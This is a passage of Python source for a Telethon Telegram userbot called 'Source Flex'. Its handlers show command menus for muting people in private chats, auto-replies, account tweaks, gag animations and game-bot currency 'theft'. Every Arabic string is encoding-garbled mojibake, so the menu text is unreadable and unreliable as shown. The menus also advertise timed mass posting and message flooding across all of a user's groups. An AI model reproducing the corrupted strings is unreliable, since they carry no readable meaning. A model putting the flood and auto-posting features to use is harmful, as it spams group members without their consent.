            await event.respond(f"ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿ¥ŸÉŸÑ ÿßŸÑŸàŸÇÿ™ ÿ•ŸÑŸâ {format_key}")
        else:
            await event.respond("ÿ¥ŸÉŸÑ ÿßŸÑŸàŸÇÿ™ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ.")
    except Exception as e:
        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿßŸàÿßŸÖÿ±'))
async def show_commands(event):
    commands_text = """ 
 ìÜ©[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑÿßŸàÿßŸÖÿ±](https://t.me/source_flex) ìÜ™
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ 
`.ŸÖ1`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿÆŸÄŸÄÿßÿµ
`.ŸÖ2`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ±ÿØŸàÿØ
`.ŸÖ3`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ŸÜŸÄŸÄÿ¥ŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ™ŸÄŸÑŸÄŸÇŸÄÿßÿ¶ŸÄŸä
`.ŸÖ4`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ≠ŸÄŸÄÿ≥ŸÄŸÄÿßÿ®
`.ŸÖ5`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ™ŸÄŸÄÿ≥ŸÄŸÑŸÄŸäŸÄŸÄÿ©
`.ŸÖ6`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ŸàÿπŸÄŸÄÿØ
`.ŸÖ7`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸäŸÄŸÄŸàÿ™ŸÄŸÄŸäŸÄŸÄŸàÿ® 
`.ŸÖ8`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸÖŸÄŸÄÿ¨ŸÄŸÄŸÖŸÄŸÄŸàÿπŸÄÿßÿ™
`.ŸÖ9`‚û™ ÿßŸàÿßŸÖŸÄÿ± ÿ™ÿ¨ŸÄŸÄŸÖŸÄŸÄŸäŸÄŸÄÿπ ÿ™ŸÄŸÑŸÄŸÇŸÄÿßÿ¶ŸÄŸä 
`.ŸÖ10`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿÆÿ∑ŸÄŸàÿ∑ ŸàÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ© 
`.ŸÖ11`‚û™ ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÜÿµŸäÿ® ÿßŸÑÿÆÿßÿ±ÿ¨Ÿä 
`.ŸÖ12`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸÖŸÄŸÄÿ∫ŸÄÿßÿØÿ±ÿßÿ™
`.ŸÖ13`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ∞ÿßÿ™ŸäŸÄŸÄÿ©
`.ŸÖ14`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑÿßÿ∂ŸÄÿßŸÅŸÄÿ©
`.ŸÖ15`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄÿ≠ŸÄŸàŸäŸÄŸÑ
`.ŸÖ16`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßÿÆŸÄÿ±Ÿâ
`.ŸÖ17`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ∞ŸÉŸÄŸÄÿßÿ° ÿßŸÑÿßÿµŸÄÿ∑ŸÄŸÜŸÄÿßÿπŸÄŸä
`.ŸÖ18`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿπÿ±ÿ∂ ÿßŸÑŸÇŸÜŸàÿßÿ™ 
`.ŸÖ19`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ≤ÿÆŸÄÿ±ŸÅŸÄÿ©
`.ŸÖ20`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßÿ∂ŸÄÿßŸÅŸÄŸäŸÄÿ©
`.ŸÖ21`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± 2 ÿßŸÑŸÄÿ™ŸÄÿ≥ŸÄŸÑŸÄŸäŸÄŸá
`.ŸÖ22`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÖŸÄŸäŸÄŸÖŸÄÿ≤
`.ŸÖ23`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄŸÇŸÄŸÑŸÄŸäŸÄÿØ ŸàÿßŸÑŸÄŸÜŸÄÿ™ŸÄÿ≠ŸÄÿßŸÑ
`.ŸÖ24`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄÿ≠ŸÄŸÄÿ¥ŸÄŸÄŸäŸÄŸÄÿ¥
`.ŸÖ25`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿµŸÄŸäŸÄÿØ ÿßŸÑŸÄŸäŸÄŸàÿ≤ÿ±ÿßÿ™
`.ŸÖ26`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄÿ´ŸÄÿ®ŸÄŸäŸÄÿ™
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(commands_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ1'))
async def show_m1_commands(event):
    m1_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿÆÿßÿµ [‚òÖ]‚îÅ‚îÅ‚îÅ><
 ‚Ä¢ `.ŸÉÿ™ŸÖ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÉÿ™ŸÖ ÿßŸÑÿ¥ÿÆÿµ -+ ÿßŸÑÿÆÿßÿµ

 ‚Ä¢ `.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÉÿ™ŸÖ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÉÿ™ŸÖ ŸÖŸÜ ÿßŸÑÿÆÿßÿµ 

 ‚Ä¢ `.ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸäŸÜ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∏Ÿáÿßÿ± ÿπÿØÿØ ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸäŸÜ ŸÅŸä ÿßŸÑÿÆÿßÿµ 

 ‚Ä¢ `.ÿßÿ∂ÿßŸÅÿ© ŸÇŸÜÿßÿ© ÿßÿ¥ÿ™ÿ±ÿßŸÉ (ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ©)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿàÿ∂ÿπ ŸÇŸÜÿßŸá ŸÑÿß ÿßÿ≠ÿØ Ÿäÿ≥ÿ™ÿ∑Ÿäÿπ ŸÖÿ±ÿßÿ≥ŸÑÿ™ŸÉ ÿßŸÑŸâ ÿ®ÿπÿØ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸäŸáÿß 

 ‚Ä¢ `.ŸÖÿ≥ÿ≠ ÿßŸÑŸÇŸÜÿßÿ©`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ŸÇŸÜÿßŸá ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÖŸÜ ÿßŸÑÿÆÿßÿµ 

 ‚Ä¢ `.ÿ≠ŸÖÿßŸäÿ© ÿßŸÑÿÆÿßÿµ`
‚ñ™Ô∏é Ÿäÿ≠ŸÖŸä ÿßŸÑÿÆÿßÿµ ŸÖŸÜ ÿßŸä ŸÉŸÑÿßŸÖÿßÿ™ ŸÖÿ≥ÿ¶Ÿá

 ‚Ä¢ `.ÿπÿØÿØ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿ™ÿ∫ŸäŸäÿ± ÿπÿØÿØ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ŸÖÿ´ÿßŸÑ .ÿπÿØÿØ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ + ÿßŸÑÿπÿØÿØ 

 ‚Ä¢ `.ŸÇÿ®ŸàŸÑ` 
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ ÿ®ŸÑ ÿÆÿßÿµ ŸàŸÑÿß ŸäŸÇŸàŸÖ ÿ®ÿ•ÿπÿ∑ÿßÿ¶Ÿá ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™

 ‚Ä¢ `.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÇÿ®ŸàŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÇÿ®ŸàŸÑ Ÿàÿ•ÿπÿ∑ÿßÿ¶Ÿá ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ 

 ‚Ä¢ `.ÿ™ÿπŸäŸäŸÜ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ∫Ÿäÿ± ŸÉŸÑŸäÿ¥Ÿá ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ± 
 
 ‚Ä¢ `.ÿπÿ±ÿ∂ ŸÉŸÑŸäÿ¥ÿ©`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ Ÿäÿπÿ±ÿ∂ ŸÉŸÑŸäÿ¥Ÿá ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ± ÿßŸÑÿ™Ÿä ÿ™ÿ≥ÿ™ÿÆÿØŸÖŸáÿß 
 
 ‚Ä¢ `.ŸÖÿ≥ÿ≠ ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ ÿßŸÑÿ∞ŸäŸÜ ÿ™ŸÖ ÿ≠ÿ∏ÿ±ŸáŸÖ ÿ®ÿ≥ÿ®ÿ® ÿßŸÑÿ™ŸÉÿ±ÿßÿ± ŸÅŸä ÿßŸÑÿÆÿßÿµ
 
 ‚Ä¢ `.ŸÖÿ≥ÿ≠ ÿßŸÑÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ÿ¨ŸÖŸäÿπ ÿ™ÿ≠ÿ∞Ÿäÿ±ÿßÿ™ ŸÑŸÑÿ¥ÿÆÿµ ÿ®ÿ±ÿØ ÿπŸÑŸäŸá

 ‚Ä¢ `.ŸÇŸÅŸÑ ÿßŸÑÿÆÿßÿµ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ŸÖÿ≥ÿ≠ ÿßŸä ÿ±ÿ≥ÿßŸÑŸá ÿ™ÿ™ŸÖ ÿßÿ±ÿ≥ŸÑŸáÿß ŸÅŸä ÿßŸÑÿÆÿßÿµ 

 ‚Ä¢ `.ŸÅÿ™ÿ≠ ÿßŸÑÿÆÿßÿµ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÅÿ™ÿ≠ ÿßŸÑÿÆÿßÿµ ŸàŸÑÿß Ÿäÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸä ÿ±ÿ≥ÿßŸÑŸá 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m1_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ2'))
async def show_m2_commands(event):
    m2_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ±ÿØŸàÿØ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÅŸä ÿßŸÑÿÆÿßÿµ

 ‚Ä¢ `.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÅŸä ÿßŸÑÿÆÿßÿµ

 ‚Ä¢ `.ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ`
‚ñ™Ô∏é ŸÇŸÖ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸä ÿ™ÿ±ŸäÿØŸáÿß ÿ±ÿØ ÿ™ŸÑŸÇÿßÿ¶Ÿä 

 ‚Ä¢ `.ÿßŸÑŸÖÿÆÿµÿµ ÿßŸÑÿ±ÿØ ÿ™ÿ¥ÿ∫ŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸä ÿ∂ŸÇÿ™Ÿáÿß ŸÅŸä ÿßŸÖÿ± ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m2_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ3'))
async def show_m3_commands(event):
    m3_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä  [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ŸÉ`  (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢ `.ÿ™ŸÉÿ±ÿßÿ±`  (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢ `.ŸÜÿ¥ÿ±` (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä` 

 ‚Ä¢ `.ŸÜÿ¥ÿ± ŸÖÿ¨ŸÖŸàÿπÿßÿ™ (ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™)` ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©

 ‚Ä¢ `.ÿÆÿßÿµ ` ÿßÿ∞ÿßÿπÿ© ŸÑŸÑÿÆÿßÿµ

 ‚Ä¢ `.ÿ≥Ÿàÿ®ÿ±` ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä :
‚ñ™Ô∏é ŸÑŸÑŸÜÿ¥ÿ± ÿ®ŸÉÿßŸÅÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ≥Ÿàÿ®ÿ± ÿßŸÑÿ™Ÿä ŸÖŸÜÿ∏ŸÖ ÿßŸÑŸäŸáÿß 

 ‚Ä¢ `ÿ™ŸÜÿßŸàÿ®` ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä : 
‚ñ™Ô∏é ŸÑŸÑŸÜÿ¥ÿ± ŸÅŸä ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿ®ÿßŸÑÿ™ŸÜÿßŸàÿ® Ÿàÿ≠ÿ≥ÿ® ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≠ÿØÿØ 

 ‚Ä¢ `.ÿ®ŸÑÿ¥` +ÿ´ŸàÿßŸÜŸä : ŸÑÿ™ŸÉÿ±ÿßÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©
‚ñ™Ô∏é ŸÖÿ´ÿßŸÑ ÿ±Ÿàÿ≠ ÿßŸÑŸÉÿ±Ÿàÿ® ÿßŸÑŸä ÿ™ÿ±ŸäÿØ ÿ™ŸÜÿ¥ÿ± ÿ®ŸäŸá ŸàÿßŸÉÿ™ÿ® ŸáÿßŸä
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì

"""
    await event.edit(m3_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ4'))
async def show_m4_commands(event):
    m4_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ≠ÿ≥ÿßÿ® [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿßÿ≥ŸÖŸä ` 
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸÅÿπŸäŸÑ ŸàŸÇÿ™ ŸäŸÖ ÿßÿ≥ŸÖŸÉ ŸÖÿ´ÿßŸÑ .ÿßÿ≥ŸÖŸä Yemen/Aden

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿßÿ≥ŸÖŸä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ŸàŸÇÿ™ ŸäŸÖ ÿßÿ≥ŸÖŸÉ

 ‚Ä¢ `.ÿßŸÑÿßÿ¥ŸÉÿßŸÑ`
‚ñ™Ô∏é Ÿäÿπÿ±ÿ∂ ŸÇÿßÿ¶ŸÖÿ© ÿßÿ±ŸÇÿßŸÖ ŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä

 ‚Ä¢ `.ÿßŸÑÿ¥ŸÉŸÑ`
‚ñ™Ô∏é ÿπŸÜÿØ ŸÉÿ™ÿßÿ®Ÿá ÿßŸÖÿ± ÿßŸÑÿßÿ¥ŸÉÿßŸÑ ÿ≠ÿØÿØ ŸÖÿ´ÿßŸÑ ÿßŸÑÿ¥ŸÉŸÑ + ÿßŸÑÿ±ŸÇŸÖ 

 ‚Ä¢ `.ÿπÿØÿßÿØ (ÿπÿØÿØ ÿßŸÑÿØŸÇÿßÿ¶ŸÇ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿπÿØÿßÿØ ÿ™ŸÜÿßÿ≤ŸÑŸä

 ‚Ä¢ `.ÿ™ŸàŸÇŸäŸÅ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸàŸÇŸäŸÅ ÿßŸÑÿπÿØÿßÿØ

 ‚Ä¢ `.ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ∫Ÿäÿ± ÿßÿ≥ŸÖŸÉ ÿØŸàŸÜ ÿ≠ÿßÿ¨Ÿá ŸÑŸÑÿ™ÿπÿ® 

 ‚Ä¢ `.ŸÖÿ≥ÿ≠ (ÿπÿØÿØ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ÿ±ÿ≥ÿßÿ¶ŸÑŸÉ 

 ‚Ä¢ `.ŸÖÿ≥ÿ≠ ÿ±ÿ≥ÿßÿ¶ŸÑŸä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ÿ¨ŸÖŸäÿπ ÿ±ÿ≥ÿßÿ¶ŸÑŸÉ ŸÅŸä ÿßŸÑŸÖŸÉÿßŸÜ ÿßŸÑŸä ŸÉÿ™ÿ®ÿ™ ŸÅŸäŸá `.ŸÖÿ≥ÿ≠ ÿ±ÿ≥ÿßÿ¶ŸÑŸä`

 ‚Ä¢ `ÿßŸÑÿßÿ¥ŸÉÿßŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ÿßÿ¥ŸÉÿßŸÑ ÿßŸÑŸàŸÇÿ™Ÿä

 ‚Ä¢ `.ÿßÿ≠ÿµÿßÿ¶Ÿäÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ÿπÿØÿØ ŸÇŸÜŸàÿßÿ™ŸÉ ŸàÿπÿØÿØ ŸÉÿ±Ÿàÿ®ÿßÿ™ŸÉ

 ‚Ä¢ `.ŸÖÿπŸÑŸàŸÖÿßÿ™Ÿä` 
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ÿ¨ŸÖŸäÿπ ŸÇŸÜŸàÿßÿ™ŸÉ ŸàŸÉÿ±Ÿàÿ®ÿßÿ™ ŸàÿπÿØÿØ ÿßŸÑÿÆÿßÿµ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m4_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ5'))
async def show_m5_commands(event):
    await event.delete()
    m5_text = """
‚ïÆ‚Ä¢‚ùê ÿßŸàÿßŸÖŸÄÿ± ÿßŸÑÿ™ÿ≥ŸÑŸäŸÄŸá ŸàÿßŸÑŸÉÿßÿ±ŸäŸÉÿ™ŸÄÿ±  ‚¶Ç 
 ‚Ä¢ `.ŸÖÿ™ÿ™` ‚Ä¢ `.ÿßŸÜÿ™ÿ≠ÿßÿ±` ‚Ä¢ `.ÿ¥ÿ±Ÿäÿ±` ‚Ä¢ `.ÿ∫ÿ®Ÿä` ‚Ä¢ `.ÿ™ÿ±ÿ≠Ÿäÿ®` ‚Ä¢ `.Ÿàÿ≠ÿ¥` ‚Ä¢ `.ŸÇÿßÿ™ŸÑ` ‚Ä¢ `.ŸÖÿ≥ÿØÿ≥` ‚Ä¢ `.ŸÉŸÑÿ®` ‚Ä¢ `.ŸáŸÑŸà` ‚Ä¢ `.ÿ´ÿπÿ®ÿßŸÜ` ‚Ä¢ `.ÿØÿ≥ ŸÑÿßŸäŸÉ` ‚Ä¢ `.ÿßÿ¥ÿßÿ±ÿ©` ‚Ä¢ `.ÿ¥ÿ±ÿ∑ÿ©` ‚Ä¢ `.ÿßÿ≠ŸÖ` ‚Ä¢ `.ÿßÿ≠ÿ®ŸÉ` ‚Ä¢ `.ÿ´ŸÑÿ¨` ‚Ä¢ `.ÿßŸÑÿ≥Ÿàÿ±ÿ≥` ‚Ä¢ `.ÿ≠ÿ®` ‚Ä¢ `.ÿ≥ÿ®ŸàŸÜÿ¨ ÿ®Ÿàÿ®` ‚Ä¢ `.ÿ∑ÿßÿ¶ÿ±Ÿá` ‚Ä¢ `.ÿµÿØŸÖŸá` ‚Ä¢ `.ŸÜÿßÿØŸÖ`  ‚Ä¢ `.ŸÇŸÜÿ®ŸÑÿ©` ‚Ä¢ `.ÿ™ŸáŸÉŸäÿ±` ‚Ä¢ `.ÿßÿÆÿ™ÿ±ÿßŸÇ`
 
 ‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
 ·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì

"""
    await event.reply(m5_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ6'))
async def show_m6_commands(event):
    m6_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ®Ÿàÿ™ ŸàÿπÿØ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ±ÿßÿ™ÿ®`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ŸÅŸÑŸàÿ≥ ÿ®Ÿàÿ™ ŸàÿπÿØ

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ±ÿßÿ™ÿ®`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸäŸÇÿßŸÅ ÿ™ÿ¨ŸÖŸäÿπ ŸÅŸÑŸàÿ≥ ŸàÿπÿØ

 ‚Ä¢ `.ÿ®ÿÆÿ¥Ÿäÿ¥`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿßÿÆÿ∞ ÿ®ÿÆÿ¥Ÿäÿ¥ ŸÖŸÜ ÿ®Ÿàÿ™ ŸàÿπÿØ

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ®ÿÆÿ¥Ÿäÿ¥`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿßŸäŸÇÿßŸÅ ÿßÿÆÿ∞ ÿ®ÿÆÿ¥Ÿäÿ¥ ŸÖŸÜ ÿ®Ÿàÿ™ ŸàÿπÿØ

 ‚Ä¢ `.ÿ≥ÿ±ŸÇÿ© (ÿßŸäÿØŸä ÿ¥ÿÆÿµ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ≥ÿ±ŸÇŸá ÿßŸÑÿ¥ÿÆÿµ ŸÖŸÜ ŸÅŸÑŸàÿ≥ ŸàÿπÿØ 

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿ≥ÿ±ŸÇÿ©`
